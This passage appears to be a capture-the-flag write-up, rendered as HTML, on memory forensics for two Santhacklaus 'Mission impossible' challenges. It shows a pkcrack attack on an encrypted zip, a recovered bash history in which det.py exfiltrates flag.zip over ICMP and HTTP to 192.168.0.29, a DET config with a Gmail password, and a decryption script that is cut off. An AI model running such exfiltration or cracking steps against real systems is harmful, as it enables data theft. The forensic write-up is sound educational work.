+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cat filescan <span class=p>|</span> grep microphone.jpg    
+</span></span><span class=line><span class=cl>          <span class=m>261768</span> 0xffff88003ce0f898 /var/www/a-strong-hero.com/jcvd-website/images/microphone.jpg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ volatility -f challenge.elf --profile<span class=o>=</span>LinuxMI1_profilex64 linux_find_file -i 0xffff88003ce0f898 -O microphone.jpg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ zip micro.zip microphone.jpg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ pkcrack-1.2.2/src/pkcrack -C unsplit.zip -c <span class=s2>&#34;jcvd-website/images/microphone.jpg&#34;</span> -P micro.zip -p <span class=s2>&#34;microphone.jpg&#34;</span> -d bitedepoulet.zip -a
+</span></span><span class=line><span class=cl>Done. Left with <span class=m>96</span> possible Values. bestOffset is 40412.
+</span></span><span class=line><span class=cl>Ta-daaaaa! <span class=nv>key0</span><span class=o>=</span>751f036a, <span class=nv>key1</span><span class=o>=</span>397078fa, <span class=nv>key2</span><span class=o>=</span>d156dfac
+</span></span><span class=line><span class=cl>Probabilistic <span class=nb>test</span> succeeded <span class=k>for</span> <span class=m>11365</span> bytes.
+</span></span><span class=line><span class=cl>Ta-daaaaa! <span class=nv>key0</span><span class=o>=</span>751f036a, <span class=nv>key1</span><span class=o>=</span>397078fa, <span class=nv>key2</span><span class=o>=</span>d156dfac
+</span></span><span class=line><span class=cl>Probabilistic <span class=nb>test</span> succeeded <span class=k>for</span> <span class=m>11365</span> bytes.
+</span></span><span class=line><span class=cl>Ta-daaaaa! <span class=nv>key0</span><span class=o>=</span>751f036a, <span class=nv>key1</span><span class=o>=</span>397078fa, <span class=nv>key2</span><span class=o>=</span>d156dfac
+</span></span><span class=line><span class=cl>Probabilistic <span class=nb>test</span> succeeded <span class=k>for</span> <span class=m>11365</span> bytes.
+</span></span><span class=line><span class=cl>Ta-daaaaa! <span class=nv>key0</span><span class=o>=</span>751f036a, <span class=nv>key1</span><span class=o>=</span>397078fa, <span class=nv>key2</span><span class=o>=</span>d156dfac
+</span></span><span class=line><span class=cl>Probabilistic <span class=nb>test</span> succeeded <span class=k>for</span> <span class=m>11365</span> bytes.
+</span></span><span class=line><span class=cl>Decrypting flag.txt <span class=o>(</span>91c644af94249dd314b62b57<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/js/.DS_Store <span class=o>(</span>2fe6d64c750f20da2d6b7b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/js/bootstrap.min.js <span class=o>(</span>31beae5a6417af2fcee27b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/js/jquery-1.11.3.min.js <span class=o>(</span>68cffaef64b77eca810f7b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/js/bootstrap.js <span class=o>(</span>172450e6004efe284b507b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/js/custom.js <span class=o>(</span>4038fc0d73419d37a34f7b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/js/ie10-viewport-bug-workaround.js <span class=o>(</span>71f134fe12dcf4d413c17b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/js/jquery.easing.min.js <span class=o>(</span>dd66d46318af5411b24b7b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/.DS_Store <span class=o>(</span>ccc90b8c7a949b1dd0297b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/images/concert.jpg <span class=o>(</span>2531ab52a4c3f2af90017b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/images/.DS_Store <span class=o>(</span>cd53bfa34fee99aade507b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/images/microphone.jpg <span class=o>(</span>e04e73cca1576915c96f7b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/images/iphone.jpg <span class=o>(</span>7d0e3ddec5bb0eb5d5537b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/images/header.jpg <span class=o>(</span>558cd122c491a4c95df47b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/images/writing.jpg <span class=o>(</span>de9b24799ceac1377f317b4e<span class=o>)</span>... OK!
+</span></span><span class=line><span class=cl>Decrypting jcvd-website/images/pencil_sharpener.jpg <span class=o>(</span>89cbb73d79aa6c0472607b4e<span class=o>)</span>... OK!
+</span></span></code></pre></td></tr></table></div></div><p>The archive is not fully decrypted, there are some glitch. But it&rsquo;s not a problem because <code>flag.txt</code> is properly decrypted! Then you just have to <code>strings</code> the new archive.</p><h3 id=flag>Flag</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ strings bitedepoulet.zip <span class=p>|</span> grep IMTLD
+</span></span><span class=line><span class=cl>IMTLD<span class=o>{</span>z1p_1s_n0t_alw4y5_s4fe<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=mission-impossible-2>Mission impossible 2</h2><h3 id=statement-1>Statement</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi2.png data-srcset="/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi2.png, /lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi2.png 1.5x, /lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi2.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi2.png title=/lib/images/writeups/2018_santhacklaus/missionImpossible/statement_mi2.png></p><iframe width=560 height=315 src=https://www.youtube.com/embed/NA2UkAcXdL0 frameborder=0 allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><p>(Awesome work again for the video :D)</p><h3 id=state-of-the-art-1>State of the art</h3><p>We got again a Debian memory dump, fortunately it&rsquo;s the same profile for the <code>Mission impossible 1</code> and this one.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ volatility -f challenge.raw --profile<span class=o>=</span>LinuxMI1_profilex64 linux_banner
+</span></span><span class=line><span class=cl>Linux version 3.16.0-6-amd64 <span class=o>(</span>debian-kernel@lists.debian.org<span class=o>)</span> <span class=o>(</span>gcc version 4.9.2 <span class=o>(</span>Debian 4.9.2-10+deb8u1<span class=o>)</span> <span class=o>)</span> <span class=c1>#1 SMP Debian 3.16.57-2 (2018-07-14)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ volatility -f challenge.raw --profile<span class=o>=</span>LinuxMI1_profilex64 linux_bash
+</span></span><span class=line><span class=cl>Pid      Name                 Command Time                   Command
+</span></span><span class=line><span class=cl>-------- -------------------- ------------------------------ -------
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   <span class=nb>cd</span> DET/
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   nano config.json 
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   sudo pip install -r requirements.txt 
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   <span class=nb>cd</span> /opt/
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   ls -alh
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   sudo git clone https://github.com/sensepost/DET
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   sudo python det.py -c config.json -p icmp,http -f flag.zip 
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   rm flag.zip 
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   cp config-sample.json config.json 
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   zip flag.zip flag.jpg -P IMTLD<span class=o>{</span>N0t_Th3_Fl4g<span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   rm flag.jpg 
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   sudo chown -R evil-hacker:evil-hacker /opt/DET/
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:08 UTC+0000   cp -v /media/evil-hacker/DISK_IMG/FOR05/flag.jpg .
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:56:47 UTC+0000   <span class=nb>history</span>
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:57:12 UTC+0000   <span class=nb>cd</span> /opt/DET/
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:57:48 UTC+0000   find . -type f -print0 <span class=p>|</span> xargs -0 md5sum md5sums.txt
+</span></span><span class=line><span class=cl>    <span class=m>1715</span> bash                 2018-11-09 22:57:57 UTC+0000   find . -type f -print0 <span class=p>|</span> xargs -0 md5sum &gt; md5sums.txt
+</span></span></code></pre></td></tr></table></div></div><p>Owh! The user is used DET (Data Exfiltration Toolkit), a little client / server for data exfiltration made by @PaulWebSec: <a href=https://github.com/sensepost/DET target=_blank rel="noopener noreffer">https://github.com/sensepost/DET</a></p><p>So, the evil hacker exfiltrates his data through ICMP and HTTP, according to the bash history. Fortunately, it&rsquo;s what we got in the PCAP:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_1.png data-srcset="/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_1.png, /lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_1.png 1.5x, /lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_1.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_1.png title=/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_1.png></p><ul><li>red framed shows the ICMP data</li><li>green framed shows the HTTP data</li></ul><h3 id=how-det-works>How DET works?</h3><p>It uses a configuration file <code>config.json</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ volatility -f challenge.raw --profile<span class=o>=</span>LinuxMI1_profilex64 linux_find_file -L &gt; filelist
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ cat filelist <span class=p>|</span> grep config.json
+</span></span><span class=line><span class=cl>          <span class=m>672629</span> 0xffff88003c16ec80 /opt/DET/config.json
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ volatility -f challenge.raw --profile<span class=o>=</span>LinuxMI1_profilex64 linux_find_file -i 0xffff88003c16ec80 -O config.json
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ cat config.json
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;plugins&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;http&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;target&#34;</span>: <span class=s2>&#34;192.168.0.29&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;port&#34;</span>: <span class=m>8080</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;google_docs&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;target&#34;</span>: <span class=s2>&#34;SERVER&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;port&#34;</span>: <span class=m>8080</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,        
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;dns&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;key&#34;</span>: <span class=s2>&#34;google.com&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;target&#34;</span>: <span class=s2>&#34;192.168.0.29&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;port&#34;</span>: <span class=m>53</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;gmail&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;dataexfil@gmail.com&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;password&#34;</span>: <span class=s2>&#34;CrazyNicePassword&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;server&#34;</span>: <span class=s2>&#34;smtp.gmail.com&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;port&#34;</span>: <span class=m>587</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;tcp&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;target&#34;</span>: <span class=s2>&#34;192.168.0.29&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;port&#34;</span>: <span class=m>6969</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;udp&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;target&#34;</span>: <span class=s2>&#34;192.168.0.29&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;port&#34;</span>: <span class=m>6969</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;twitter&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;username&#34;</span>: <span class=s2>&#34;PaulWebSec&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;CONSUMER_TOKEN&#34;</span>: <span class=s2>&#34;XXXXXXXXXXX&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;CONSUMER_SECRET&#34;</span>: <span class=s2>&#34;XXXXXXXXXXX&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;ACCESS_TOKEN&#34;</span>: <span class=s2>&#34;XXXXXXXXXXX&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;ACCESS_TOKEN_SECRET&#34;</span>: <span class=s2>&#34;XXXXXXXXXXX&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;icmp&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;target&#34;</span>: <span class=s2>&#34;192.168.0.29&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>,
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;slack&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;api_token&#34;</span>: <span class=s2>&#34;xoxb-XXXXXXXXXXX&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;chan_id&#34;</span>: <span class=s2>&#34;XXXXXXXXXXX&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;bot_id&#34;</span>: <span class=s2>&#34;&lt;@XXXXXXXXXXX&gt;:&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;AES_KEY&#34;</span>: <span class=s2>&#34;IMTLD{This_is_just_a_key_not_the_flag}&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;max_time_sleep&#34;</span>: 10,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;min_time_sleep&#34;</span>: 1,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;max_bytes_read&#34;</span>: 400,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;min_bytes_read&#34;</span>: 300,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;compression&#34;</span>: <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>So, now we got those informations:</p><ul><li>AES Key: IMTLD{This_is_just_a_key_not_the_flag}</li><li>We know it uses DET compression (zlib)</li></ul><h3 id=how-data-are-exfiltrated>How data are exfiltrated?</h3><p>This is what it looks like in HTTP packets:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_2.png data-srcset="/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_2.png, /lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_2.png 1.5x, /lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_2.png 2x" data-sizes=auto alt=/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_2.png title=/lib/images/writeups/2018_santhacklaus/missionImpossible/mi2_2.png></p><p>With a little <code>tshark</code> command I was able to extract all base64:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ tshark -r challenge.pcapng -Y http -Tfields -e urlencoded-form.value &gt; data_http.b64
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ cat data_http.b64 <span class=p>|</span> base64 -d <span class=p>|</span> less
+</span></span><span class=line><span class=cl>z6f9HaX<span class=p>|</span>!<span class=p>|</span>1<span class=p>|</span>!<span class=p>|</span>246760c25e3f659efe1b8299032616c0a6c92ce1d72addcf01183fd535d83abc5ce238d49d9bd255e8be9161ba00ab68a5dc2882c9159d055002085b7c0bb55b5ffe596b9229ac6280acacec248d187b2559fc4e1d8eb2a2711aeaf96616b52c39410d6423f877817cdb8e827086badbf1390331c87e2291c56756f696f4f02bb26d2ccf93c906c91ddebe9a2f68086e679a3c562217646afe79227ef5b9c485ffaef859fe42c35e4627a63c017d39b5e8d11fb32ddce0d88cbbb5a74c0215e3be78de850fa30b0b03cffaa041096810459559864c9f0bc0ac4e214c58ca8b89b73248130f096005a00b555d028d8c8cd7f69e57d6f925c2ea262a3b067d809dfaf8f825e7c4b8e02a54376d5d209a1e15a3866f544a03917a80cc183def3b6fac629a5e6fbdcbcf6cbe0a1713791651fbf6cd1917601b18709e3738bc03c4ba8ce55f13df90ed4603bb1d86de0fa4ab8d36a4ab010477e3270d31439e446d872730
+</span></span><span class=line><span class=cl>z6f9HaX<span class=p>|</span>!<span class=p>|</span>5<span class=p>|</span>!<span class=p>|</span>8f7507923c3481c900f9d0c2b84b9517b1b0bf488148a9759bf26205c6471295e591587ae7d11d871bd31080b390d444d972a60eb799d3ea8ac7da599695588c8052a5d14ea1aa93ae6af1d6f76f4d62483a60f1c6e3713d31245f1817699695f1cb44e4b4ce1a6737cab1ac04f17a21d1053be83a6a59bc287ee5a42a7ec6dff033645715ef41e72bcf7495fcf04785c7612bd64def432940f13959c73d9cf79fb364ba6a5a891a713abb58bde1486caf187f9a398078c0744652838059ce0d10b903279692f0513e0f88af96796d85ab2f712866c2d8637a746e0d228bb736384e6c43ef253a0aa7cfba1219ce2393ce57bcf05b53a858858a665bc80d46c51289dcb6e9674c30563d03bbb80221e714349ffadf19afcce37206b8da66ef5f7fb2f3739c64f9699536ff545b73a6d37de627cb
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ tshark -r challenge.pcapng -Y icmp.resp_to -Tfields -e data.data <span class=p>|</span> tr -d <span class=s1>&#39;:&#39;</span> <span class=p>|</span> xxd -r -p <span class=p>|</span> sed <span class=s1>&#39;s/ejZmO/\nejZmO/g&#39;</span> &gt; data_icmp.b64
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ cat data_icmp.b64 <span class=p>|</span> base64 -d <span class=p>|</span> less
+</span></span><span class=line><span class=cl>z6f9HaX<span class=p>|</span>!<span class=p>|</span>flag.zip<span class=p>|</span>!<span class=p>|</span>REGISTER<span class=p>|</span>!<span class=p>|</span>3682490664d5bf7905397710edb84737
+</span></span><span class=line><span class=cl>z6f9HaX<span class=p>|</span>!<span class=p>|</span>0<span class=p>|</span>!<span class=p>|</span>f8e946873b6e3a34035d82b1aadec650edc693c449b064a06bd1c7432e801193b497f998d1265e7e9da7b4ea56d650ae0dfbd717ef4dd1418d2d9b4e68b835f166643a705acd64c60e56add715a064524363bff1152aae8c2b2e82548c7f7f0f69690d18733e42de352ce5bb6fd5b2b696688ad84a80d3862cab8274d4b5a79065f4be827f36cd0271ae6ed1306107437e26bbdfce7fcfe3d0840e03a4bb5b776b5501582240cbaeccc8c6969653973805209cdcdc2e2c70325cabf8ecc8ad7f192b8b0d7c0bde5489a10e23175a4e593641862d625145d3a9f1b8de163325c534bc6c303109f63b2bd7ea5bdd22cefd8e1415b8374811c5d656eac67b924e2f7f170821b77361513ad6d9e0972641f83a8cac5776e09320b657dd0c1d6449c19c032d77d92c80fa991e9eefc585aab8e7a5feb56ea7
+</span></span><span class=line><span class=cl>z6f9HaX<span class=p>|</span>!<span class=p>|</span>2<span class=p>|</span>!<span class=p>|</span>3de71e0826b4f3c85d0b17931d2effd04913e6320e30e73f5cc652c9e3a7f3bb4bbce092648283324298d594aae4f8bfa73732b492e479c4d1d642310ce0a3344186f9bc21ac86833010ef2bd6b2e31b9251690902b660448f88b9dc48963270d603942fc5910715d0d4f18224316f571116e05be4f0404f468ef856eab4ad6f38683aa0b935d0bc9933231d3262b54aca672be1fd2cb0d59fc49c807de24dc582501396dd54b67efe2fe7687b0c62de63de5c278200c3288269729cf7428fc0b48298699a808a141fc3bee1ba01a90c51faed07c3d35149c5988f9301e2e70a9d955b1545581522f90f4a2e9c88cf8e502bca12128ba0cb77409220c259035bc3ca1727e017713abb08b9491675f20bad831ba685edaefa572ca8da0c56bfb3615048a0764305dc219936237f5764cdc1031d024591c66ef92d38bbe9a73614411e27z6f9HaX<span class=p>|</span>!<span class=p>|</span>3<span class=p>|</span>!<span class=p>|</span>8037dbd29c0393e519050999210fe5ce63880109a09bf879b09b8b9f952d438d51d8b54
+</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>Ok, the data follow the following pattern:</p><blockquote><p>ID|!|number|!|AES encrypted data</p></blockquote><h3 id=scripting-and-decryption-time>Scripting and decryption time</h3><p>According the previous scenarios, I just have to sort all packet by number, extract encrypted data and decrypt / decompress it.</p><p>Here is my quick and dirty script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python2</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=n>b64decode</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>zlib</span> <span class=kn>import</span> <span class=n>compress</span><span class=p>,</span> <span class=n>decompress</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Function from DET Github</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>aes_decrypt</span><span class=p>(</span><span class=n>message</span><span class=p>,</span><span class=n>key</span><span class=p>):</span>
